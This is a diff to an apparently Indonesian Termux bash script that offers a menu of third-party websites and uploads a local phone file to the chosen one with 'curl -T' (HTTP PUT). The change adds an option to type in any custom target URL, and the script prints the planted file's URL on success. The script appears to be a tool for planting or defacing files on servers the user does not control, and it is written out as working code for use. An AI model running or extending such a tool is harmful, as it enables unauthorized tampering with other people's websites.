@@ -43,6 +43,8 @@ echo "9. http://8x8.co.za"
 echo $k
 echo "10. http://montdestin.com"
 echo $k
+echo "99. Punya target sendiri"
+echo $k
 echo "00. gak jadi deh gada kuota:("
 echo $k
 echo " "
@@ -106,10 +108,19 @@ then
 curl -T /storage/emulated/0/$kk http://montdestin.com
 echo "udah cok http://montdestin.com/$kk"|lolcat
 fi
+if [ $cc = 99 ] || [ $cc = 99 ]
+then
+read -p "Masukan Targetnya: " dua
+fi
 if [ $cc = 00 ] || [ $cc = 00 ]
 then
 echo "maknya bos jangan banyak liat vokep:v" |lolcat
 echo "makasih ya sudah gunakan tools ini"|lolcat
 echo "mau nanya2 silahkan wa ke nomor diatas"|lolcat
 exit
+fi
+if [ $dua ]
+then
+curl -T /storage/emulated/0/$kk $dua
+echo "udah cok $dua/$kk"|lolcat
 fi
